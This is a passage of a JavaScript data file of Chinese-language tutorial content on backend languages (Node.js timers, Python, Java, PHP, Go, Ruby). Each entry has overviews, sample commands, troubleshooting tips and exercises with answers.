      { title: 'process.nextTick vs setImmediate vs setTimeout 0', content: '这是 Node.js 事件循环中优先级最高的混淆点：\n\nprocess.nextTick（Node.js 独有）\n- 不属于 Event Loop 的任何阶段，在每轮各个阶段之间检查\n- 优先级高于所有微任务（Promise.then）\n- 滥用会导致 I/O 饥饿（因为 nextTick 队列永远先执行）\n\nsetImmediate（Node.js 独有）\n- 在每轮 Event Loop 的 check 阶段执行\n- 在 I/O 回调之后，在下一次 Timer 之前\n- 和 setTimeout(fn, 0) 的执行顺序取决于调用时机\n\nsetTimeout(fn, 0)\n- 在 Timer 阶段执行（每轮最开始）\n- 实际最小延迟约 1-4ms（受系统限制）\n\n经验法则：\n- 想让回调在当前操作完成后立即执行 → process.nextTick\n- 想让回调在 I/O 回调之后执行 → setImmediate\n- 只想异步执行但不关心时机 → setTimeout(fn, 0)（最安全、最通用）' },
    ],
    diagnosis: [
      { symptom: 'Node.js 服务突然所有请求超时，但进程没挂，CPU 100%', cause: 'Event Loop 被阻塞——某个同步操作（大 JSON 解析、大数组循环、正则回溯灾难）占用了主线程太久，所有请求排队等待。', fix: '1) 用 clinic doctor 或 --prof 定位 CPU 热点 2) 检查是否有 JSON.parse 处理超大 JSON（几十 MB）3) 大数组改为分页处理或用 Stream 4) 检查正则表达式是否有灾难性回溯 5) 紧急：重启服务，长期：将 CPU 密集任务拆分或移出 Node.js。' },
      { symptom: 'setTimeout 设置的 0ms 延迟实际执行比预期晚很多', cause: 'setTimeout(fn, 0) 并不是立即执行——它至少要等到下一个 Timer 阶段。如果当前宏任务执行时间很长（如大循环），或者 Node.js 设的最小延时（1ms），实际延迟可能 10-50ms。', fix: '1) 如果是 Node.js，用 setImmediate 或 process.nextTick 替代（看场景）2) 如果是浏览器，用 Promise.resolve().then() 或 queueMicrotask 获得更快的异步 3) 不要依赖 setTimeout(fn, 0) 做精确计时。' },
      { symptom: 'async/await 写的代码，错误没有被 try/catch 捕获', cause: 'await 后面的 Promise 如果 reject，会被抛出异常。但如果 Promise 后面用了 .catch() 或没被 await（fire-and-forget），异常就静默丢失了。', fix: '1) 所有 await 包裹在 try/catch 中 2) 永远不要让 Promise 没有错误处理——每个 Promise 链末尾都应该有 .catch() 3) Node.js 监听 unhandledRejection 事件做兜底日志。' },
    ],
    exercises: [
      { level: '基础', task: '预测并验证这段代码的输出顺序：setTimeout(()=>console.log("A"), 0); Promise.resolve().then(()=>console.log("B")); console.log("C");', hint: '同步 → 微任务 → 宏任务', answer: '输出 C → B → A。C 是同步代码，B 是微任务（Promise.then），A 是宏任务（setTimeout）。记住口诀：先同步、清微任务、再宏任务。' },
      { level: '进阶', task: '写一段能"阻塞" Node.js Event Loop 的代码（让服务器 5 秒内不响应），然后用 Worker Threads 修复', hint: 'while(Date.now()-start<5000){} 会阻塞。修复用 new Worker() 把计算移出主线程', answer: '阻塞代码：app.get("/slow", (req, res) => { while(Date.now()-start<5000){}; res.send("done"); })。修复：const worker = new Worker("./heavy-task.js"); worker.on("message", result => res.json(result)); worker.postMessage(input)。主线程不再阻塞。' },
      { level: '挑战', task: '实现一个简单的"任务队列"：用 Event Loop 机制，限制同时只能处理 3 个任务，其余排队', hint: '维护 running 计数器 + queue 数组。每个任务完成后检查队列', answer: 'class TaskQueue { constructor(concurrency) { this.concurrency = concurrency; this.running = 0; this.queue = []; } add(task) { return new Promise((resolve) => { this.queue.push({ task, resolve }); this.next(); }); } next() { while (this.running < this.concurrency && this.queue.length) { const { task, resolve } = this.queue.shift(); this.running++; task().then(result => { resolve(result); this.running--; this.next(); }); } } }。这个模式在限流、爬虫并发控制中常用。' },
    ],
  },

  // ============================================================
  // 22. Python / Python
  // ============================================================
  "J_sVHsD72Yzyqb9KCIvAY": {
    mentalModel: 'Python 是后端界的"瑞士军刀"——做什么都行（Web/脚本/AI/数据处理/爬虫），虽然单项性能不如专用工具（刀不如菜刀，剪不如剪刀），但胜在一个工具覆盖 80% 场景。它最大的优势是"让人把精力花在解决问题上，而不是花在和语言搏斗上"。',
    sections: [
      { title: 'Python 后端全景——优势、劣势、最佳场景', content: '优势（为什么选 Python）：\n1) 学习曲线最低——花一天学基础语法就能写能跑的代码。print("hello") 就是 Hello World，没有任何样板代码。\n2) AI/ML 生态无敌——PyTorch、TensorFlow、LangChain、Hugging Face。做 AI 相关后端，Python 是唯一选择。\n3) 数据处理能力——Pandas（表格处理）、NumPy（数值计算）是数据工程师的标准工具。\n4) FastAPI——现代 Python Web 框架，性能接近 Node.js，自动生成 OpenAPI 文档，类型提示驱动。2024 年最推荐。\n5) 胶水语言——可以调用 C/C++ 库（通过 ctypes/Cython），做性能敏感的底层优化。\n\n劣势（为什么不用 Python）：\n1) GIL（Global Interpreter Lock）——同一进程同一时间只有一个线程执行 Python 字节码。多线程对 CPU 密集任务没用（多进程是 workaround 但开销大）。\n2) 动态类型——大型项目重构时"改了一个函数的参数类型，不知道哪里还在调用"。类型提示（Type Hints）改善了这个问题但不如静态语言强制。\n3) 运行速度——比 Go/Java/C# 慢 10-100 倍（纯 Python 代码）。关键路径可以用 C 扩展或用 PyPy。\n4) 依赖管理碎片化——pip/poetry/pipenv/pdm/uv...不像 npm/yarn/cargo 那样统一。\n\n最佳场景：AI 服务后端、数据 API、快速原型、内部工具、自动化脚本、教育/学习。' },
      { title: 'Python 三大 Web 框架选型指南', content: 'FastAPI（推荐，2020 年发布）：\n- 异步优先（基于 Starlette + Pydantic）\n- 自动生成 Swagger/OpenAPI 文档（/docs 页面）\n- 类型提示 + 数据校验合一（定义一个 Pydantic Model 就同时有了校验和文档）\n- 性能：接近 Node.js（uvicorn 服务器）\n- 缺点：生态相对年轻，复杂场景的插件/教程不如 Django 丰富\n- 适合：新项目、API 服务、微服务\n\nDjango（老牌，2005 年发布）：\n- "电池全包含"——ORM、Admin 后台、认证、模板、表单全内置\n- Admin 后台是杀手级功能——几行代码就有一个完整的数据管理界面\n- 稳定、文档极丰富、社区极大\n- 缺点：重（很多用不到的功能）、异步支持晚（Django 3.1+ 才开始）\n- 适合：内容管理系统、管理后台、快速建站\n\nFlask（极简，2010 年发布）：\n- 微框架——核心只有路由 + 请求/响应，其他全靠插件\n- 极度灵活——你决定用什么 ORM、什么认证、什么结构\n- 缺点：没有标准项目结构，新手容易写出"一团面"代码\n- 适合：小 API、学习 WSGI 原理、需要极致定制的项目' },
    ],
    handsOn: [
      { title: 'FastAPI 最小完整 API（6 行代码）', cmd: 'cat > /tmp/fastapi_demo.py << \'EOF\'\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\napp = FastAPI()\nclass Item(BaseModel):\n    name: str\n    price: float\n@app.post("/items")\nasync def create_item(item: Item):\n    return {"name": item.name, "price_with_tax": item.price * 1.13}\nEOF\npip install fastapi uvicorn -q && uvicorn fastapi_demo:app --host 0.0.0.0 --port 8000 &', output: 'INFO:     Uvicorn running on http://0.0.0.0:8000\nINFO:     OpenAPI docs at http://0.0.0.0:8000/docs', explain: '6 行代码就创建了一个带数据校验（name: str, price: float）和自动文档的 API。访问 /docs 看到交互式 API 文档，可以直接在浏览器里测试接口。Pydantic Model 同时负责了请求校验 + 类型转换 + 文档生成。' },
    ],
    diagnosis: [
      { symptom: 'Python API 在高并发下性能急剧下降，QPS 上不去', cause: '同步阻塞 I/O 导致并发瓶颈——每个请求都在等数据库/外部 API 返回。', fix: '1) 用 async/await + 异步驱动（asyncpg/aiomysql）2) FastAPI + uvicorn workers 提高并发 3) CPU 密集任务通过 Celery 异步队列处理。' },
      { symptom: '服务器上 pip install 报 command not found 或装错 Python 版本', cause: '系统同时存在 Python 2/3 或多个虚拟环境，pip 指向错误的 Python 版本。', fix: '1) 用 python3 -m pip install 确保版本正确 2) 项目用 venv/poetry 隔离环境 3) Docker 镜像中指定准确 Python 版本。' },
    ],
    exercises: [
      { level: '基础', task: '用 Python 内置的 http.server 模块在一行命令中启动一个文件下载服务器', hint: 'python3 -m http.server PORT', answer: 'python3 -m http.server 8000 启动后浏览器访问 http://localhost:8000 就可以浏览/下载当前目录的文件。这是 Python 的一大优势——标准库极其丰富，连 Web 服务器都内置了。' },
      { level: '进阶', task: '写一个 FastAPI 应用：GET /weather?city=北京 返回一个 JSON（模拟数据），自动生成 API 文档', hint: 'FastAPI + Query 参数 + Pydantic Response Model', answer: '@app.get("/weather") def weather(city: str = Query(...)): return {"city": city, "temp": 22, "humidity": 60}。访问 /docs 看到自动生成的文档。用 curl "localhost:8000/weather?city=北京" 测试。' },
    ],
  },

  // ============================================================
  // 23. Java / Java
  // ============================================================
  "ANeSwxJDJyQ-49pO2-CCI": {
    mentalModel: 'Java 是后端界的"重卡"——启动慢（JVM 预热）、车身重（内存占用大），但一旦跑起来就能拉最多的货、跑最远的路、连续运行几年不熄火。银行核心系统、电商交易平台、电信计费系统——这些对稳定性要求极高的场景，大多是 Java 在撑。',
    sections: [
      { title: 'Java 后端全景——大厂为什么选 Java', content: '优势：\n1) JVM 生态——20 年积累的成熟度。类加载、JIT 编译、GC 调优、监控工具（JMX/JConsole/Arthas），每个环节都有完善方案。\n2) Spring Boot——最完整的后端框架。IoC 容器、AOP、事务管理、安全、数据访问、消息、缓存——全在一个生态里。\n3) 强类型 + 编译检查——改一个方法签名，所有调用方编译就报错。大型项目（几百人协作）的这种"编译期安全带"价值不可估量。\n4) 多线程性能——无 GIL 限制，JIT 编译优化后性能接近 C++。\n5) 国内岗位最多——阿里/美团/京东/字节大量用 Java。\n\n劣势：\n1) 语法啰嗦——一个简单的 REST 接口需要写 Class/Annotation/Getter/Setter。Java 17+ 的 record 和文本块改善了不少。\n2) 启动慢 + 内存占用大——Spring Boot 应用启动要 10-30 秒，内存几百 MB 起步。GraalVM Native Image 正在改善。\n3) 学习曲线陡——JVM 原理（类加载/GC/内存模型）+ Maven/Gradle + Spring 全家桶，内容多。\n4) 快速原型开发不如 Python/Node.js——改一行代码 → 重启 → 等 20 秒，节奏慢。\n\n适合：大型企业系统、电商/金融核心系统、需要强类型+团队协作的大型项目。' },
      { title: 'Spring Boot 三层架构精讲', content: '标准的三层架构（Layered Architecture）：\n\nController 层（表示层）：\n- @RestController + @RequestMapping 定义 API\n- 职责：接收请求、参数校验（@Valid）、调用 Service、返回响应\n- 不写业务逻辑！不写 SQL！\n- 一个 Controller 通常对应一个 URL 前缀（如 /api/users）\n\n示例：\n@RestController\n@RequestMapping("/api/users")\npublic class UserController {\n    @Autowired private UserService userService;\n    \n    @GetMapping("/{id}")\n    public ResponseEntity<UserDto> getUser(@PathVariable Long id) {\n        return ResponseEntity.ok(userService.getUserById(id));\n    }\n}\n\nService 层（业务逻辑层）：\n- @Service 注解\n- 职责：业务逻辑、事务管理（@Transactional）、调用 Repository\n- 一个 Service 方法通常对应一个业务操作（不是简单的"查数据库"）\n\nRepository 层（数据访问层）：\n- @Repository 或继承 JpaRepository\n- 职责：数据库操作（增删改查）\n- 不写业务逻辑！\n\n三层的好处：\n- 每层职责明确，修改不影响其他层（改数据库不影响 Controller）\n- 测试可以逐层 Mock\n- 新人看代码知道去哪找什么' },
    ],
    handsOn: [
      { title: '用 Spring Initializr 创建一个最小项目', cmd: 'curl -s https://start.spring.io/starter.zip -d type=maven-project -d language=java -d bootVersion=3.2.0 -d baseDir=demo -d groupId=com.example -d artifactId=demo -d dependencies=web -o /tmp/demo.zip && unzip -qo /tmp/demo.zip -d /tmp/spring-demo && ls /tmp/spring-demo/src/main/java/com/example/demo/', output: 'DemoApplication.java', explain: 'Spring Initializr 是官方项目生成器。web 依赖包含了 Spring MVC + 内嵌 Tomcat + Jackson（JSON 序列化），一个命令就得到了完整的项目骨架。@SpringBootApplication 注解自动启用组件扫描和自动配置。' },
    ],
    diagnosis: [
      { symptom: 'Spring Boot 应用启动后内存占用持续增长，最终 OOM', cause: '内存泄漏——ThreadLocal 未清理、静态集合持续增长、未关闭的 IO 流。', fix: '1) 用 jmap -dump 导出 heap dump，Eclipse MAT 分析 2) 检查所有 Service/Component 中的静态引用 3) 确认所有连接在 finally 中关闭或用 try-with-resources。' },
      { symptom: 'Transactional 方法内抛了异常但数据没有回滚', cause: 'Spring 默认只对 RuntimeException 和 Error 回滚，checked Exception 不回滚。', fix: '1) Transactional(rollbackFor = Exception.class) 2) 注意事务只对 Spring 代理调用的方法生效——同类中 this.method() 不触发事务 3) 确认数据库引擎支持事务。' },
    ],
    exercises: [
      { level: '基础', task: '说出 Spring Boot 标准三层架构的名称和各自职责，并说明数据在各层之间如何流转', hint: 'Controller → Service → Repository', answer: 'Controller 接收 HTTP 请求 → 参数校验 → 调用 Service。Service 执行业务逻辑、事务管理 → 调用 Repository。Repository 执行数据库操作（JPA/MyBatis）→ 返回数据。数据在各层之间以 DTO/Entity 形式传递。Controller 返回 DTO 给客户端。' },
      { level: '进阶', task: '解释 @Transactional 注解的作用：在一个 Service 方法上加了这个注解，如果方法中两个数据库操作第二个失败了，第一个会不会回滚？', hint: '默认只回滚 RuntimeException 和 Error', answer: '@Transactional 开启数据库事务。方法中所有数据库操作在同一个事务中——要么全成功（commit），要么全失败（rollback）。默认只对 RuntimeException（非受检异常）回滚，对 checked Exception 不回滚（除非指定 rollbackFor）。两个操作中第二个失败抛 RuntimeException → 第一个自动回滚。' },
    ],
  },

  // ============================================================
  // 24. PHP / PHP
  // ============================================================
  "l9Wrq_Ad9-Ju4NIB0m5Ha": {
    mentalModel: 'PHP 是 Web 开发的"老兵"——它参加过最惨烈的战争（Web 2.0 时代），至今还守着 WordPress 这座"要塞"（全球 43% 的网站跑在 WordPress 上）。它也许不是最酷的语言，但它简明直接的设计哲学让几代 Web 开发者快速上手。Rasmus Lerdorf 创造 PHP 时说的是："我只是想给我的个人主页加点动态功能。"',
    sections: [
      { title: 'PHP 的准确生态定位（2024 年）', content: 'PHP 的市场现状：\n- W3Techs 2024 数据：77.4% 的服务端编程网站使用 PHP（主要是 WordPress 拉高的）\n- 实际上是指存量巨大、增量越来越少\n- 新项目选 PHP 的比例在持续下降\n\nPHP 的核心生态：\n1) WordPress——全球最流行的 CMS（内容管理系统）。43% 的网站用 WP，WP 本身、主题、插件都是 PHP 写的。这意味着庞大的 PHP 就业市场（WP 定制开发、插件开发、维护）。\n2) Laravel——让 PHP 在现代框架中重新变得有竞争力。Eloquent ORM、Artisan CLI、Blade 模板、队列/调度/广播全部内置。Laravel 的生态（Laravel Forge 服务器管理、Laravel Vapor Serverless、Laravel Nova 管理面板）把 PHP 带入了现代开发流程。\n3) Symfony——企业级 PHP 框架，Laravel 底层的很多组件来自 Symfony。适合大型企业应用。\n\n谁适合学 PHP：\n- 想做 WordPress 开发/定制/插件\n- 目标公司在用 PHP（很多传统公司/媒体/电商）\n- 想快速接外包建站（WordPress 建站需求量极大）\n\n谁不适合学 PHP 作为第一语言：\n- 目标是大厂后端（国内大厂很少用 PHP 做核心系统）\n- 想做云原生/微服务\n- 追求新技术栈' },
      { title: 'Laravel 的优雅——PHP 现代开发代表', content: 'Laravel 让 PHP 的开发体验不输任何现代框架：\n\nEloquent ORM——最优雅的数据库操作：\n// 获取所有活跃用户的文章，按日期排序\n$posts = User::where("active", true)\n    ->first()\n    ->posts()\n    ->where("published", true)\n    ->orderBy("created_at", "desc")\n    ->get();\n\n链式调用读起来像英文句子。\n\nArtisan CLI——代码生成器：\nphp artisan make:model Post -mc  // 一行生成 Model + Migration + Controller\nphp artisan make:job ProcessPodcast  // 生成队列 Job\nphp artisan migrate  // 执行数据库迁移\n\nLaravel 生态：\n- Laravel Forge：服务器管理（自动配置 Nginx/MySQL/Redis）\n- Laravel Vapor：Serverless 部署到 AWS Lambda\n- Laravel Nova：管理后台面板（类似 Django Admin）\n- Laravel Horizon：Redis 队列监控面板' },
    ],
    diagnosis: [
      { symptom: 'WordPress 网站突然变慢，后台打开要 10 秒以上', cause: '常见 PHP 瓶颈：wp_postmeta 表膨胀、PHP-FPM 进程数不够、未做 opcode 缓存。', fix: '1) MySQL 慢查询日志定位耗时 SQL 2) wp_postmeta 加索引或清理冗余 3) 调整 PHP-FPM pm.max_children 4) 启用 OPcache。' },
      { symptom: 'Laravel .env 改了数据库密码但代码还在用旧密码', cause: 'Laravel config 缓存了旧配置——php artisan config:cache 把值写入了 bootstrap/cache/config.php。', fix: '1) 改 .env 后执行 php artisan config:clear 2) 生产环境不要直接改 .env，应通过环境变量注入 3) 部署流程中包含 config:cache 步骤。' },
    ],
    exercises: [
      { level: '基础', task: '说出 PHP 在后端领域最大的生态优势是什么，为什么这个优势能持续存在', hint: '全球多少网站用 PHP 写的 CMS？', answer: 'WordPress。全球 43% 的网站用 WordPress，WP 本身用 PHP 编写。这个存量极其庞大，意味着持续的维护、定制、插件开发需求。即使新项目用得少，维护旧系统的岗位会持续很久。' },
      { level: '进阶', task: '对比 PHP 和 Node.js 处理 HTTP 请求的模型差异：PHP 是"请求-进程"模型，Node.js 是"事件驱动"模型', hint: 'PHP 每个请求启动/复用进程，Node.js 是单进程事件循环', answer: 'PHP-FPM（FastCGI Process Manager）：维护一个进程池，每个请求分配给一个空闲进程处理，处理完进程返回池。进程之间完全隔离（一个挂了不影响其他）。缺点是进程数有限制，并发受限于进程数。Node.js：单进程+事件循环处理所有请求，一个请求阻塞影响所有。优点是并发能力强（几万连接），缺点是阻塞会拖垮整个服务。两种模型各有适用场景。' },
    ],
  },

  // ============================================================
  // 25. Go / Go 语言
  // ============================================================
  "BdXbcz4-ar3XOX0wIKzBp": {
    mentalModel: 'Go 是 Google 给云原生时代量身打造的"集装箱卡车"——设计极其简洁（25 个关键字），编译出一个单文件扔到服务器就能跑（不用装运行时），天生自带高并发能力（goroutine 就像成群的小蚂蚁，轻量、独立、高效协作）。没有花哨的语法糖，但写出来的代码十年后还能轻松读懂。',
    sections: [
      { title: 'Go 的六大杀手级特性', content: '1) 编译为单一静态二进制文件\n   编译完是一个可执行文件，目标服务器不需要装 Go 运行时。拷贝这个文件 + 运行 = 部署完成。\n   对比：Java 需要 JDK + Tomcat，Python 需要解释器 + pip install，Node.js 需要 node_modules。\n   Docker 里最极致的镜像：FROM scratch + COPY myapp / → 镜像只有几 MB。\n\n2) goroutine + channel 并发模型\n   go func() { ... }() —— 一个 go 关键字就创建一个协程。\n   goroutine 不是操作系统线程，是 Go runtime 管理的用户态轻量线程。一个线程上可以跑成千上万个 goroutine，切换成本极低。\n   两个 goroutine 间用 channel 通信："不要通过共享内存来通信，而要通过通信来共享内存"（Go 的并发哲学）。\n\n3) 极其简洁的语法\n   只有 25 个关键字（Java 有 50+，C++ 有 90+）。没有类继承、没有泛型（Go 1.18 加了但克制）、没有异常（用返回值 error 代替 try/catch）。\n   简洁不是简陋——Go 用组合（embedding）代替继承，用接口（interface）实现多态，用 error 返回值代替异常，每一种取舍都有深思熟虑。\n\n4) 编译速度快\n   大型项目几秒编译完成（Go 从设计之初就强调编译速度）。开发体验接近脚本语言——改了代码马上能跑测试。\n\n5) 标准库极其丰富\n   net/http：生产级 HTTP 服务器/客户端（不需要 Nginx/Tomcat）\n   encoding/json：JSON 序列化（反射自动映射）\n   database/sql：数据库操作接口 + 连接池\n   crypto/tls：HTTPS 支持\n   testing：内置测试框架 + benchmark\n   一个 import 都不用加就能写完整的 REST API 服务。\n\n6) 工具链统一\n   go fmt：强制统一代码格式（不用争论空格 vs Tab，全社区一个风格）\n   go mod：依赖管理\n   go test：测试\n   go build：编译\n   go vet：静态分析\n   所有工具都是 go 的子命令，不需要 webpack/eslint/prettier/babel 这种碎片化工具链。' },
      { title: 'Go 新手学习路径——6 步走', content: '第 1 步：基础语法（2-3 天）\n- 变量（var, :=）、基本类型（int, string, bool, float64）\n- 控制流（if, for, switch——注意没有 while，用 for 替代）\n- 函数（多返回值、命名返回值、defer）\n- 复合类型（array, slice, map, struct）\n\n第 2 步：方法和接口（1-2 天）\n- 给 struct 定义方法\n- interface 定义行为契约（Go 的 interface 是隐式实现的——不需要声明 implements）\n- 理解"组合优于继承"\n\n第 3 步：并发（3-5 天）\n- goroutine：go 关键字启协程\n- channel：chan 类型，<- 操作符\n- select：多路复用 channel\n- sync 包：Mutex、WaitGroup、Once\n- 理解"并发不是并行"\n\n第 4 步：标准库关键包（3-5 天边做边学）\n- net/http：写 API 服务器和客户端\n- encoding/json：序列化/反序列化\n- database/sql + driver：数据库操作\n- context：超时控制、取消传播\n\n第 5 步：做项目（2-4 周）\n- 一个完整的 REST API（用户 CRUD + JWT 认证 + PostgreSQL）\n- 用标准库或 Gin 框架\n\n第 6 步：测试和工具（持续学习）\n- go test（表驱动测试）\n- go test -bench（性能基准测试）\n- pprof（CPU/内存分析）\n- go build -ldflags（编译优化）' },
      { title: 'Go 不适合的场景——不要硬套', content: 'Go 不是万能语言，以下场景慎重：\n\n1) 复杂业务抽象：Go 没有继承、没有注解、泛型表达能力弱。复杂的领域模型（如金融产品、保险规则）用 Java/C# 的表达力更强。\n\n2) 传统 MVC Web 应用：Go 的模板引擎弱，不适合服务端渲染 HTML 的场景。你需要前后端分离或用 Next.js/Nuxt。\n\n3) 快速原型需要很多第三方集成：Python/Ruby/Rails 的 gem/pip 生态在"什么都有现成的"方面远胜 Go。\n\n4) 桌面 GUI 应用：Go 几乎没有成熟的桌面 UI 库。\n\n最适合 Go 的：云原生微服务、API 网关、CLI 工具、网络代理、基础设施工具（Docker/K8s/Terraform/Prometheus 都是 Go 写的）、高并发服务。' },
    ],
    handsOn: [
      { title: '用 Go 标准库写一个完整的 HTTP 服务器（不依赖任何框架）', cmd: `cat > /tmp/goserver.go << 'EOF'
package main
import (
	"encoding/json"
	"fmt"
	"net/http"
)
type Response struct {
	Message string \`json:"message"\`
	Method  string \`json:"method"\`
}
func handler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	resp := Response{Message: "Hello from Go!", Method: r.Method}
	json.NewEncoder(w).Encode(resp)
}
func main() {
	http.HandleFunc("/api/hello", handler)
	fmt.Println("Server running on :8080")
	http.ListenAndServe(":8080", nil)
}
EOF
cd /tmp && go run goserver.go &`, output: 'Server running on :8080', explain: '标准库 net/http 是生产级的——不需要 Nginx/Tomcat 等外部服务器。json.NewEncoder(w).Encode() 可以流式写入 JSON（不用一次性构建完整 JSON 字符串）。编译后 go build -o server 生成独立可执行文件，可以在任何 Linux 上直接运行。' },
    ],
    diagnosis: [
      { symptom: 'Go 程序 goroutine 越来越多但永不释放，内存持续增长', cause: 'goroutine 泄漏——goroutine 在等待一个永远不会收到消息的 channel，或等待一个永远不会返回的 mutex。', fix: '1) 用 runtime.NumGoroutine() 监控 goroutine 数量（应该稳定，不应持续增长）2) 检查所有 channel 发送/接收处，确保有退出路径（context 取消 / close(channel)）3) 用 pprof 的 goroutine profile 查看所有 goroutine 的堆栈，找到阻塞点。' },
      { symptom: 'channel 操作导致死锁（fatal error: all goroutines are asleep - deadlock!）', cause: '在同一个 goroutine 中 unbuffered channel 的发送和接收互相等待——发送方等接收方，接收方等发送方。', fix: '1) 给 channel 加缓冲：make(chan int, 1) 2) 发送和接收放在不同 goroutine 中 3) 用 select + default 做非阻塞操作 4) 检查无缓冲 channel 的"握手"逻辑。' },
    ],
    exercises: [
      { level: '基础', task: '用 Go 写一个函数，并发请求 3 个 URL，返回最快那一个的结果', hint: '用 goroutine + channel，或 sync.Once', answer: 'func fastest(urls []string) string { ch := make(chan string, len(urls)); for _, url := range urls { go func(u string) { resp, _ := http.Get(u); ch <- u }(url) }; return <-ch }。注意要用 buffered channel（len(urls)）防止 goroutine 泄漏（慢的 goroutine 发不进 channel 会永远阻塞）。' },
      { level: '进阶', task: '解释 Go 的 defer 执行顺序：如果有多个 defer，执行顺序是什么？如果 defer 中修改了命名返回值，外部会看到修改后的值吗？', hint: 'LIFO（后进先出），defer 在 return 之后、函数返回之前执行', answer: '多个 defer 按 LIFO 顺序执行（类似栈）。defer 在 return 语句执行后、函数真正返回前执行——所以 defer 可以读取和修改命名返回值。示例：func f() (r int) { defer func() { r++ }(); return 5 } 返回的是 6（return 5 先设 r=5，defer 中 r++ 改成 6，然后函数返回）。' },
      { level: '挑战', task: '用 Go 实现一个简易的"工作池"（Worker Pool）：N 个 goroutine 从 channel 中取任务执行，任务完成后结果写入另一个 channel', hint: '创建 jobs channel 和 results channel，启动 N 个 worker goroutine，用 WaitGroup 等所有 worker 完成', answer: 'jobs := make(chan int, 100); results := make(chan int, 100); for w := 1; w <= N; w++ { go worker(w, jobs, results) }; for j := 1; j <= numJobs; j++ { jobs <- j }; close(jobs); for r := 1; r <= numJobs; r++ { <-results }。这是 concurrency 模式最经典的应用——Docker/K8s 内部到处是类似的 Worker Pool。' },
    ],
  },

  // ============================================================
  // 26. Ruby / Ruby
  // ============================================================
  "SlH0Rl07yURDko2nDPfFy": {
    mentalModel: 'Ruby 是"程序员的快乐语言"——Matz（松本行弘）设计 Ruby 时的哲学是"代码首先是给人看的，其次才是给机器执行的"。Ruby 的语法像英语一样自然，Rails 框架让你 15 分钟就能搭出一个博客。GitHub、Shopify、Basecamp 这些百亿级公司最初都是用 Ruby on Rails 快速验证然后做大的。',
    sections: [
      { title: 'Ruby 和 Rails 的定位——快速开发的哲学', content: 'Ruby 的核心理念：\n- "程序员快乐第一"（Developer Happiness）\n- 一切都是对象（1.class 返回 Integer，nil.class 返回 NilClass）\n- 约定优于配置（Convention over Configuration）——按约定写代码，框架帮你做 90% 的决定\n\nRails 的核心理念：\n- DRY（Don\'t Repeat Yourself）：不要重复自己\n- RESTful：资源导向的 URL 设计（Rails 是 REST 的早期推广者）\n- 全栈框架：MVC + ORM（ActiveRecord）+ 路由 + 模板 + WebSocket（ActionCable）+ 后台任务（ActiveJob）+ 邮件（ActionMailer）全部内置\n\n一行命令生成完整 CRUD：\nrails generate scaffold Post title:string body:text published:boolean\n这个命令生成：\n- Model（业务逻辑+验证）\n- Controller（7 个标准 REST 动作）\n- Views（列表/详情/新建/编辑/表单局部）\n- 数据库 Migration\n- 路由定义\n- 测试文件\n- JSON API 响应\n\n你只需要写一行命令 → 修改模板 → 加业务规则，一个完整的功能就上线了。这种速度在其他框架中需要写几小时。\n\n适合场景：\n- 创业 MVP（快速验证想法）\n- SaaS 产品（Basecamp、GitHub 早期、Shopify 都用 Rails）\n- 内部工具\n\n不适合：\n- 需要精细性能控制的场景\n- 高并发微服务\n- 国内市场（岗位少）' },
      { title: '约定优于配置——实例对比', content: '对比 Rails 的"约定"和传统框架的"配置"：\n\n数据库映射（ORM）：\nRails（约定）：Post 模型 → 自动映射到 posts 表。表有 title 列 → 模型自动有 title 属性。不需要任何配置。\nJava JPA（配置）：@Entity @Table(name="posts") 注解 + @Column(name="title") 注解。显式声明每个映射。\n\nURL 路由：\nRails（约定）：resources :posts → 自动生成 7 个 REST 路由（GET /posts, GET /posts/:id, GET /posts/new, POST /posts, GET /posts/:id/edit, PATCH /posts/:id, DELETE /posts/:id）\n其他框架：手动写 7 条路由规则。\n\n视图查找：\nRails（约定）：PostsController#index → 自动渲染 views/posts/index.html.erb。不需要配置。\n其他框架：需要显式指定模板路径。\n\n约定的代价：\n- 新人如果不了解约定，会"魔法太多看不懂"——为什么只写了一个 Model 就有这么多功能？\n- 打破约定需要额外配置，有些复杂场景约定不够灵活\n- 但 80% 的常见场景，约定帮你省去了大量样板代码' },
    ],
    diagnosis: [
      { symptom: 'Rails 应用每个 worker 进程内存占用 1GB+', cause: 'ActiveRecord 加载了过多关联数据到内存——未用 select/pluck 限制字段，或未分页加载大表。', fix: '1) 用 select() 只查需要的列 2) find_each/batch 分批处理大数据集 3) 避免 N+1，用 includes/eager_load 预加载 4) 用 derailed_benchmarks 做内存分析。' },
      { symptom: 'Rails migration 在开发环境成功但在生产环境报错', cause: '生产环境数据量大导致 migration 锁表时间过长，或有危险操作如 change_column 类型转换失败。', fix: '1) 大表 migration 用 pt-online-schema-change 在线改表 2) 先在 staging（有生产级数据量）测试 3) 设置 statement_timeout 防止长时间锁表。' },
    ],
    exercises: [
      { level: '基础', task: '理解"约定优于配置"的核心思想——用 Rails 的 Post 模型举例说明', hint: 'Model 名 → 表名、Model 属性 → 表列、Controller 名 → 视图路径', answer: '定义 class Post < ApplicationRecord 之后，Rails 自动：1) 映射到 posts 表 2) 根据 posts 表的列自动生成属性（title、body 等）3) 自动加上 id、created_at、updated_at 字段 4) 提供 Post.find、Post.where 等查询方法。这些都不需要任何配置——因为 Rails "约定"了这些映射规则。' },
      { level: '进阶', task: '对比 Rails 和 Spring Boot 创建一个简单 CRUD 需要的代码量和步骤', hint: 'Rails: rails g scaffold。Spring: 手写 Entity/Repository/Service/Controller', answer: 'Rails：rails g scaffold Post title:string body:text 一行，生成完整 MVC+迁移+测试。Spring Boot：需要手写 @Entity 类、@Repository 接口、@Service 类、@RestController 类、application.yml 配置——至少 5 个文件 60+ 行 Java 代码。Rails 适合快速迭代，Spring Boot 适合大型工程。' },
    ],
  },

  // ============================================================
  // 27. C# / C#/.NET
  // ============================================================
  "rImbMHLLfJwjf3l25vBkc": {
    mentalModel: 'C# 是微软打造的一把"瑞士精工军刀"——设计上吸收了 Java 的优点并修复了它的槽点（比如真正的泛型而非类型擦除、async/await 更早更好用），LINQ 让数据操作像写 SQL 一样优雅。曾经被锁定在 Windows 生态，现在 .NET Core 跨平台（Linux/Mac/Windows）让它从"Windows 专用"变成"真正的跨平台利器"。',
    sections: [
